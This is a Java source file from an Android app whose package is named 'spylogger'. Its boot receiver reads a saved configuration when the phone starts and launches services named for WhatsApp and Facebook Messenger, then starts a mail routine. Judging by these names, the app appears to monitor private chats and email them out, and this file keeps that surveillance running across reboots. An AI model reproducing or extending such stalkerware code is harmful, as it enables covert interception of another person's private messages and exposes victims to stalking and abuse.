package com.gravatasufoca.spylogger.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.gravatasufoca.spylogger.utils.Utils;
import com.gravatasufoca.spylogger.dao.DatabaseHelper;
import com.gravatasufoca.spylogger.services.MessengerService;
import com.gravatasufoca.spylogger.model.Configuracao;
import com.gravatasufoca.spylogger.services.WhatsAppService;
import com.j256.ormlite.dao.Dao;

import java.sql.SQLException;


public class BootStarter extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {

		try {
			Dao<Configuracao, Integer> dao= (new DatabaseHelper(context)).getConfiguracaoDao();

			Configuracao configuracao= dao.queryForAll().get(0);
			boolean check=false;
			if(configuracao.isWhatsApp()){
				Intent myIntent = new Intent(context, WhatsAppService.class);
				context.startService(myIntent);
				check=true;
			}

			if(configuracao.isFacebook()){
				Intent myIntent = new Intent(context, MessengerService.class);
				context.startService(myIntent);
				check=true;
			}

			if(check){
				Utils.startMail(context);
			}

		} catch (SQLException e) {
			e.printStackTrace();
		}

	}
}